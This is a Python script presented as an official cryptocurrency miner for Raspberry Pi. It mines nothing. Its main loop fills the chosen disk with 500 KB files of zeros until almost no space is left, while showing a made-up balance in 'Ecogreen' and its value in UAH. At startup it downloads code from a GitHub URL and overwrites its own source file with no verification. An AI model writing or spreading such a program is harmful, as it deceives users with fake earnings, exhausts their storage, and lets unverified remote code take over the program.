import os
import time
import sys
import urllib.request
import shutil
import math
import random

UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/ecomainer.py"
BALANCE_FILE = "/home/pi/BB_ecogreen.txt"  # Путь, совместимый с Raspberry Pi OS

APP_NAME = "Ecogreen Miner"
APP_VERSION = "2.5"
APP_DESCRIPTION = "Official Ecogreen Mining Application."
APP_AUTHOR = "Mavox-ID"
APP_COMPANY = "OOO Kripto"
APP_CITY = "NaN"

def check_for_updates():
    try:
        with urllib.request.urlopen(UPDATE_URL) as response:
            response_text = response.read().decode('utf-8')

        with open(__file__, "r") as current_file:
            current_code = current_file.read()

        if response_text != current_code:
            with open(__file__, "w") as current_file:
                current_file.write(response_text)
            print("The application is updated. Please restart the program, otherwise, the conclusion from the old miner will be reset.")
            time.sleep(10)
            sys.exit()
    except Exception as e:
        print(f"Failed to check for updates: {e}")
        time.sleep(5)
        sys.exit()

def display_intro():
    intro_text = f"""
    Welcome to the official Ecogreen mining application!
    Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
    By default, 10 files are created per second, earning 0.01 Ecogreen per 300 files.
    Current rate: 1050 UAH = 1 Ecogreen.
    Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
    Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
    Version: {APP_VERSION}
    Company: {APP_COMPANY}
    Author: {APP_AUTHOR}
    """
    sys.stdout.write("\033[H\033[J")
    print(intro_text)
    time.sleep(10)

def check_disk_exists(disk_path):
    return os.path.exists(disk_path)

def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, "r") as f:
            lines = f.readlines()
            if len(lines) >= 2:
                ecogreen_balance = float(lines[0].strip())
                uah_balance = float(lines[1].strip())
                return ecogreen_balance, uah_balance
    return 0.0, 0.0  

def save_balance(ecogreen_balance, uah_balance):
    with open(BALANCE_FILE, "w") as f:
        f.write(f"{ecogreen_balance}\n{uah_balance}")

def mine_ecogreen(disk_path):
    ecogreen_folder = os.path.join(disk_path, "Ecogreen")
    os.makedirs(ecogreen_folder, exist_ok=True)

    balance, uah_balance = load_balance()
    tasks_resolved = 0  
    file_count = 0

    while True:
        a = random.randint(1, 10000000000)
        b = random.randint(1, 1000000)
        c = random.randint(1, 1000000)

        try:
            result = math.sqrt(a) / b - c  
            tasks_resolved += 2
        except ZeroDivisionError:
            pass

        file_path = os.path.join(ecogreen_folder, f"ecogreen.h_{file_count}.eco")
        with open(file_path, "wb") as f:
            f.write(b"\x00" * 500000) 

        file_count += 1
        if file_count % 300 == 0:
            balance += 0.01  
            uah_balance = balance * 1050.0  

            save_balance(balance, uah_balance)

        sys.stdout.write("\033[H\033[J")
        print(f"HDD: {disk_path}/")
        print("HS: 10 F/S")
        print(f"CR: Created file {file_path}")
        print(f"DS: checked {tasks_resolved} tasks") 
        print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")

        total, used, free = shutil.disk_usage(disk_path)
        free_kb = free // 1024  

        if free_kb < 1024:  
            print("\nWarning! Not enough memory to continue mining. Contact support for assistance.")
            time.sleep(15)
            break

        if free_kb >= 1024 * 1024:
            print(f"Remaining space: {free_kb / (1024 * 1024):.2f} GB")
        elif free_kb >= 1024:
            print(f"Remaining space: {free_kb / 1024:.2f} MB")
        else:
            print(f"Remaining space: {free_kb:.2f} KB")
        print("OOO kriptoTM & binance (Ecogreen 2019)")

        time.sleep(0.1)

if __name__ == "__main__":
    check_for_updates() 
    display_intro() 

    while True:
        default_path = "/media/pi"
        if check_disk_exists(default_path):
            print("Default disk found. Starting mining...")
            time.sleep(5)
            mine_ecogreen(default_path)
        else:
            print("No default mining disk found.")
            disk_path = input("Enter the full path to the disk to use (e.g., /media/pi/DISK_NAME): ").strip()
            if check_disk_exists(disk_path):
                print(f"Disk {disk_path} found. Starting mining...")
                time.sleep(5)
                mine_ecogreen(disk_path)
            else:
                print(f"Disk {disk_path} not found. Try again.")
